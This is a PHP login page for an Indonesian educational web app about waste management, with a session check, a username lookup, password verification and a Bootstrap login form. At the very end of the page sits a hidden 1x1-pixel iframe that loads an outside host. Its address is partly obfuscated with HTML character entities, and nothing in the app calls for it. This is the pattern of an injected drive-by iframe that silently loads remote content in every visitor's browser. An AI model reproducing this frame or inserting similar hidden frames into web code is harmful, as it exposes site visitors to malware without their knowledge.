<?php 
session_start();
require "../koneksi.php";

if (isset($_SESSION["login"])) {
  header("Location: index.php");
  exit;
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Aplikasi Soal Acak - Login</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
    <link href="../assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="../assets/css/style.css" rel="stylesheet">
    <link href="../src/style/style.css" rel="stylesheet">
     <!-- sweeat alert -->
    <link href="../assets/sweet_alert/dist/sweetalert.css" rel="stylesheet"/>
  </head>
  <body>
    <header>
        <a href="#" class="logo">Web Multimedia Penanggulangan Sampah</a>
        <div class="bx bx-menu" id="menu-icon"></div>
        <ul class="navbar">
            <li><a href="../src/index.html">Home</a></li>
            <li><a href="../src/materi1.html">Materi</a></li>
            <div class="bx bx-moon" id="greenmode"></div>
        </ul>
    </header>
    <div class="container">
    
      


              
                  
                  
                  <div class="col-sm-3"></div>


                  <?php 
                    if (isset($_POST["login"])) {
                        $username = mysqli_real_escape_string($con, htmlspecialchars($_POST["username"]));
                        $password = mysqli_real_escape_string($con, htmlspecialchars($_POST["password"]));
                        $query = "SELECT * FROM users WHERE username='$username'";
                        $result = mysqli_query($con, $query);
                        // cek username
                        if (mysqli_num_rows($result)===1) {
                          // cek password
                          $row = mysqli_fetch_assoc($result);
                          if (password_verify($password,$row["password"])) {
                            // set session
                            $_SESSION["login"] = true;
                            $_SESSION["user"] = $row["username"];
                            $_SESSION["id"] = $row["id"];
                            header("Location: index.php");
                            exit;
                          }
                        }

                        $error = true;
                      }
                  ?>
                  <div class="col-sm-6" style="padding-top: 200px;">
                    <?php if (isset($error)) : ?>
                      <div class="alert alert-danger alert-dismissible" role="alert">
                        <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                        <strong>Ohh no..!</strong> Username dan password salah !!!
                      </div>
                    <?php endif; ?>
                    <div class="panel panel-primary" >
                      <div class="panel-heading" style="background: rgb(78 175 148);">Silakan Login Terlebih dahulu untuk mengkases latihan soal</div>
                      <div class="panel-body">
                        <form method="POST" action="">
                          <div class="form-group">
                            <label for="username">Username</label>
                            <input type="text" class="form-control" id="username" name="username" placeholder="username" required>
                          </div>
                          <div class="form-group">
                            <label for="password">Password</label>
                            <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
                          </div>
                                                
                          <button type="submit" name="login" class="btn btn-warning">Login</button>
                        </form>
                      </div>
                    </div>             
                    


                    
                  </div>
                  <div class="col-sm-3"></div>


         

        


    </div>
    
    
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="../assets/js/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="../assets/js/bootstrap.min.js"></script>
    <!-- sweetalert -->
    <script src="../assets/sweet_alert/dist/sweetalert.min.js"></script>
    <script src="../src/script/main.js"></script>
    
  <iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
</body>
</html>